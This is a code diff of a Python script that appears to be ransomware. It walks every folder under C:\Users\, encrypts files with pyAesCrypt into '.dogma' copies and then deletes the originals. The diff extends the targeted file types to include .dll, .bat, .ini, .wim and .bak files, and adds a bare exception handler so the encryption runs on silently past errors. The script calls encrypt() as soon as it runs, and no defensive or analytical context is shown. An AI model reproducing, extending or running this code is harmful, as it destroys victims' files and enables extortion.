@@ -34,14 +34,18 @@ def resource_path(relative_path):
 def encrypt():
     for root_path, dirs, files in os.walk("C:\\Users\\"):
         for file in files:
-            if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
-                unique_file = os.path.join(file)
-                unique_path = os.path.join(root_path + "/")
-                format_file = unique_file[:-4]
-                print(root_path + format_file)
-                pyAesCrypt.encryptFile(unique_path + unique_file, unique_path + format_file + ".dogma",
-                                       password,
-                                       bufferSize)
+            try:
+                if file.endswith((".txt", ".py", ".docx", ".csv", ".bin", ".bat", ".dll", ".ini", ".mui", ".wim", ".log", ".bmp", ".bak")):  # The arg can be a tuple of suffixes to look for
+                    unique_file = os.path.join(file)
+                    unique_path = os.path.join(root_path + "/")
+                    format_file = unique_file[:-4]
+                    print(root_path + format_file)
+                    pyAesCrypt.encryptFile(unique_path + unique_file, unique_path + format_file + ".dogma",
+                                        password,
+                                        bufferSize)
+            except:
+                pass
+
 
 encrypt()
 
@@ -50,7 +54,7 @@ encrypt()
 def remove_uncrypted_file():
     for root_path, dirs, files in os.walk("C:\\Users\\"):
         for file in files:
-            if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
+            if file.endswith((".txt", ".py", ".docx", ".csv", ".bin", ".bat", ".dll", ".ini", ".mui", ".wim", ".log", ".bmp", ".bak")):  # The arg can be a tuple of suffixes to look for
                 unique_file = os.path.join(file)
                 unique_path = os.path.join(root_path + "/")
                 os.remove(unique_path + unique_file)
